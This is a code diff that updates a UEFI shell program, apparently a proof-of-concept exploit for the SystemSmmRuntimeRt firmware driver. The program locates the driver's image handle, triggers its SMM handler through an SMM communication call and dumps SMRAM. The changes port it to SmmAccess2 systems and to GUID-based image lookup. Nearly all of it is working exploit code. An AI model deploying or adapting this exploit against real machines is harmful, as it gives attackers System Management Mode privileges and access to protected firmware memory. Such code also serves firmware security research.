@@ -14,9 +14,11 @@
 #include <Library/UefiBootServicesTableLib.h>
 #include <Library/ShellLib.h>
 #include <Library/ShellCEntryLib.h>
+#include <Library/DevicePathLib.h>
 
 #include <Protocol/SmmBase.h>
 #include <Protocol/SmmAccess.h>
+#include <Protocol/SmmAccess2.h>
 #include <Protocol/LoadedImage.h>
 #include <Protocol/SimpleFileSystem.h>
 
@@ -25,7 +27,7 @@
 #include "hexdump.h"
 
 // image name for SystemSmmRuntimeRt UEFI driver
-#define IMAGE_NAME L"FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E)"
+STATIC EFI_GUID mImageName = {0x7C79AC8C, 0x5E6C, 0x4E3D, 0xBA, 0x6F, 0xC2, 0x60, 0xEE, 0x7C, 0x17, 0x2E};
 
 // SMM communication data size
 #define BUFF_SIZE 0x1000
@@ -81,13 +83,17 @@ VOID SmmHandler(VOID *Context, VOID *Unknown, VOID *Data)
     }
 }
 //--------------------------------------------------------------------------------------
-EFI_STATUS GetImageHandle(CHAR16 *TargetPath, EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
+EFI_STATUS GetImageHandle(IN EFI_GUID *Name, EFI_HANDLE *HandlesList, UINTN *HandlesListLength)
 {
+    EFI_STATUS Status;
     EFI_HANDLE *Buffer = NULL;
-    UINTN BufferSize = 0, HandlesFound = 0, i = 0;    
+    UINTN BufferSize = 0, HandlesFound = 0, i = 0;
+    EFI_LOADED_IMAGE *LoadedImage = NULL;
+    EFI_DEVICE_PATH_PROTOCOL              *DevicePath;
+    EFI_DEVICE_PATH_PROTOCOL              *PrevDevicePath;
 
     // determinate handles buffer size
-    EFI_STATUS Status = gBS->LocateHandle(
+    Status = gBS->LocateHandle(
         ByProtocol,
         &gEfiLoadedImageProtocolGuid,
         NULL,
@@ -119,39 +125,52 @@ EFI_STATUS GetImageHandle(CHAR16 *TargetPath, EFI_HANDLE *HandlesList, UINTN *Ha
     {
         for (i = 0; i < BufferSize / sizeof(EFI_HANDLE); i += 1)
         {
-            EFI_LOADED_IMAGE *LoadedImage = NULL;
-
             // get loaded image protocol instance for given image handle
             if (gBS->HandleProtocol(
                 Buffer[i],
                 &gEfiLoadedImageProtocolGuid, 
-                (VOID *)&LoadedImage) == EFI_SUCCESS)
+                (VOID **)&LoadedImage) == EFI_SUCCESS)
             {
                 // get and check image path
-                CHAR16 *Path = ConvertDevicePathToText(LoadedImage->FilePath, TRUE, TRUE);
-                if (Path)
-                {                            
-                    if (!wcscmp(Path, TargetPath))
-                    {
-                        if (HandlesFound + 1 < *HandlesListLength)
-                        {
-                            // image handle was found
-                            HandlesList[HandlesFound] = Buffer[i];
-                            HandlesFound += 1;                        
-                        }
-                        else
-                        {
-                            // handles list is full
-                            Status = EFI_BUFFER_TOO_SMALL;
+                DevicePath = LoadedImage->FilePath;
+                PrevDevicePath = DevicePath;
+
+                while (DevicePath && !IsDevicePathEnd (DevicePath)) {
+                    if ((DevicePathType(DevicePath) == MEDIA_DEVICE_PATH) && 
+                        (DevicePathSubType(DevicePath) == MEDIA_PIWG_FW_FILE_DP)) {
+                        MEDIA_FW_VOL_FILEPATH_DEVICE_PATH *Path = (MEDIA_FW_VOL_FILEPATH_DEVICE_PATH *)DevicePath;
+
+                        // Compare image GUID
+                        if (!memcmp (&Path->FvFileName, Name, sizeof (EFI_GUID))) {
+
+                            if (HandlesFound + 1 < *HandlesListLength)
+                            {
+                                // image handle was found
+                                HandlesList[HandlesFound] = Buffer[i];
+                                HandlesFound += 1;                        
+                            }
+                            else
+                            {
+                                // handles list is full
+                                Status = EFI_BUFFER_TOO_SMALL;
+                                break;
+                            }
                         }
                     }
 
-                    gBS->FreePool(Path);                                        
-
-                    if (Status != EFI_SUCCESS)
-                    {
+                    // Advance to next DevicePath node
+                    DevicePath = NextDevicePathNode (DevicePath);
+                    
+                    // If it didn't work (e.g. broken node, length = 0, ...), break
+                    if (DevicePath == PrevDevicePath) {
                         break;
                     }
+                    PrevDevicePath = DevicePath;
+                }
+                
+                if (Status != EFI_SUCCESS)
+                {
+                    break;
                 }
             }
         }
@@ -277,7 +296,7 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
     }
 
     printf("Buffer for SMM communicate call is allocated at 0x%llx\n", Data);    
-    printf("Obtaining %S image handles...\n", IMAGE_NAME);
+    //printf("Obtaining %g image handles...\n", &mImageName);
 
     /*
         Obtain image handle, SystemSmmRuntimeRt UEFI driver registers sub_A54() as 
@@ -285,7 +304,7 @@ EFI_STATUS SystemSmmRuntimeRt_Exploit(EXPLOIT_HANDLER Handler)
         We can determinate this handle value using LocateHandle() function of
         EFI_BOOT_SERVICES.
     */
-    if (GetImageHandle(IMAGE_NAME, HandlesList, &HandlesListLength) == EFI_SUCCESS)
+    if (GetImageHandle(&mImageName, HandlesList, &HandlesListLength) == EFI_SUCCESS)
     {
         if (HandlesListLength > 0)
         {
@@ -386,17 +405,17 @@ EFI_STATUS WriteFile(EFI_HANDLE ImageHandle, char *FilePath, VOID *Data, UINTN *
 //--------------------------------------------------------------------------------------
 int main(int Argc, char **Argv)
 {
-    int Ret = -1;
+    int Ret = 0; // -1 immediately exits from EFI shell, can't see output of program
     char *lpszOutPath = NULL;
     EFI_STATUS Status = EFI_SUCCESS;    
     EFI_SMM_ACCESS_PROTOCOL *SmmAccess = NULL;  
 
-    EFI_SMRAM_DESCRIPTOR SmramMap[MAX_SMRAM_REGIONS];
-    UINTN SmramMapSize = sizeof(SmramMap), i = 0;
+    EFI_SMRAM_DESCRIPTOR *SmramMap = NULL;
+    UINTN SmramMapSize = 0, i = 0;
 
     if (Argc >= 2)
     {
-        if ((g_DumpAddr = (VOID *)strtoull(Argv[1], NULL, 16)) == 0 && errno == EINVAL)
+        if ((g_DumpAddr = (VOID *)(UINTN)strtoull(Argv[1], NULL, 16)) == 0 && errno == EINVAL)
         {
             printf("strtoull() ERROR %d\n", errno);
             return errno;
@@ -404,7 +423,7 @@ int main(int Argc, char **Argv)
 
         if (Argc >= 3)
         {
-            if ((g_DumpSize = strtoull(Argv[2], NULL, 16)) == 0 && errno == EINVAL)
+            if ((g_DumpSize = (UINTN)strtoull(Argv[2], NULL, 16)) == 0 && errno == EINVAL)
             {
                 printf("strtoull() ERROR %d\n", errno);
                 return errno;
@@ -436,15 +455,35 @@ int main(int Argc, char **Argv)
     }
 
     // locate SMM access protocol
-    if ((Status = gBS->LocateProtocol(&gEfiSmmAccessProtocolGuid, NULL, &SmmAccess)) != EFI_SUCCESS)
+    if ((Status = gBS->LocateProtocol(&gEfiSmmAccessProtocolGuid, NULL, (VOID **)&SmmAccess)) != EFI_SUCCESS)
     {
-        printf("ERROR: Unable to locate SMM access protocol: 0x%.8x\n", Status);
+        SmmAccess = NULL;
+        printf("ERROR: Unable to locate SMM access protocol, trying SmmAccess2...\n");
+        if ((Status = gBS->LocateProtocol(&gEfiSmmAccess2ProtocolGuid, NULL, (VOID **)&SmmAccess)) != EFI_SUCCESS)
+        {
+            printf("ERROR: Unable to locate SmmAccess2 protocol: 0x%X\n", Status);
+            goto _end;
+        }
+    }
+
+    printf("SMM access protocol is at 0x%p\n", (VOID *)SmmAccess);
+
+    // get SMRAM regions information
+    Status = SmmAccess->GetCapabilities (SmmAccess, &SmramMapSize, NULL);
+    
+    if (Status != EFI_BUFFER_TOO_SMALL)
+    {
+        printf("GetCapabilities() ERROR 0x%X\n", Status);
         goto _end;
     }
 
-    printf("SMM access protocol is at 0x%llx\n", SmmAccess);
-
-    // get SMRAM regions information
+    SmramMap = NULL;
+    if ((Status = gBS->AllocatePool(EfiRuntimeServicesData, SmramMapSize, (VOID **)&SmramMap)) != EFI_SUCCESS)
+    {
+        printf("AllocatePool() ERROR 0x%.8x\n", Status);
+        return -1;
+    }
+    
     if ((Status = SmmAccess->GetCapabilities(SmmAccess, &SmramMapSize, SmramMap)) != EFI_SUCCESS)
     {
         printf("GetCapabilities() ERROR 0x%.8x\n", Status);
@@ -482,6 +521,11 @@ int main(int Argc, char **Argv)
 
 _end:
 
+    if (SmramMap)
+    {
+        gBS->FreePool(SmramMap);   
+    }
+    
     if (g_DumpBuff)
     {
         gBS->FreePool(g_DumpBuff);   
